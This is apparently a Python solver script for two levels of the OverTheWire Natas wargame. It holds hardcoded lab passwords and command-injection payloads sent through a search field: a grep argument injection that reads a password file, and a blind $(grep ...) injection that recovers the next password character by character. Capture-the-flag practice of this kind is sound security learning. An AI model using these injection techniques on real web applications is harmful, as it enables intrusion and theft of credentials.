from requests import post, get
from requests.exceptions import RequestException
from requests.auth import HTTPBasicAuth


def get_natas_11_password():
    auth = HTTPBasicAuth("natas10", "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE")
    payload = 'a /etc/natas_webpass/natas11 '
    response = post("http://natas10.natas.labs.overthewire.org/", data={"needle":payload}, auth=auth).text
    res_list = response.split('\n')
    print(res_list)
    res = [res for res in res_list if not res.startswith("dictionary.txt")]
    print(res)

def get_natas_17_password():
    auth = HTTPBasicAuth("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
    alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    dictionary = []
    for char in alpha :
        try:
            #had weird behavior passing an f string as query string parameter
            response = get("http://natas16.natas.labs.overthewire.org", params={"needle":"Englishing$(grep "+char+" /etc/natas_webpass/natas17)", "submit":"Search"}, auth=auth)
        except RequestException:
            print("exception thrown")
        # print(response.status_code)
        # print(response.request)
        # print(response.text)
        if "Englishing" in response.text:
            dictionary.append(char)
    print(dictionary)
    password = []
    while len(password) < 32:
        for char in dictionary:
            password.append(char)
            try:
                response = get("http://natas16.natas.labs.overthewire.org/?needle=Englishing$(grep ^"+"".join(password)+" /etc/natas_webpass/natas17)", auth=auth)
            except RequestException:
                print("exception thrown")
            if "Englishing" not in response.text:
                password.pop()
                break
            print("".join(password))
    print("".join(password))
            

if __name__ == "__main__":
    get_natas_17_password()
